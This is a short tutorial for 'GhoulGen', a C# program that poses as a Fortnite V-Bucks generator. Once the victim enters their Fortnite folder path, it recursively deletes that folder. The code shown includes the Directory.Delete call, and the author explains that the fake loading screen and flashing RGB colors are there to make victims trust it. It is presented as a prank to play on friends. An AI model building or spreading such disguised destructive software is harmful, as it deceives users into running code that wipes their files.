## GhoulGen C# Tutorial
This is a simple program in C#. This is literally all it takes to waste 10 minutes of your friends precious lifetime.
```csharp
if (Directory.Exists(fortnite))
  {
     Directory.Delete(fortnite, true);
  }else{
     MessageBox.Show("Invalid File Path!", "GhoulGen", MessageBoxButtons.OK, MessageBoxIcon.Error);
  }
  ```
 
It also strings the username and the fortnite directory, aswell as the amount of vbucks he wants. This is just to make it more realistic.
 ```csharp
string userName = username.Text;
string fortnite = textBox1.Text;
```

Also added RGB to the form. Who in the right mind wouldn't trust some random software made in 10 minutes with some cool changing colors?
```csharp
private void rgb()
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            int rgbamount = 1;
            int r = 255;
            int g = 0;
            int b = 0;
            for (; ; )
            {
                this.BackColor = Color.FromArgb(r, g, b);
                bool flag = r > 0 && b == 0;
                if (flag)
                {
                    r -= rgbamount;
                    g += rgbamount;
                }
                bool flag2 = g > 0 && r == 0;
                if (flag2)
                {
                    g -= rgbamount;
                    b += rgbamount;
                }
                bool flag3 = b > 0 && g == 0;
                if (flag3)
                {
                    b -= rgbamount;
                    r += rgbamount;
                }
                Thread.Sleep(5);
            }
        }
```

I even took the time and bothered to add a whole loading screen. Once again, literal useless. Just to make it look more realistic.

![](https://images-ext-1.discordapp.net/external/l2Mqf90-YSlKX8Yq4qWeZYLH3d9Em_mTXD6jJ0sIg-k/https/cdn.upload.systems/uploads/v0pJosbk.png)
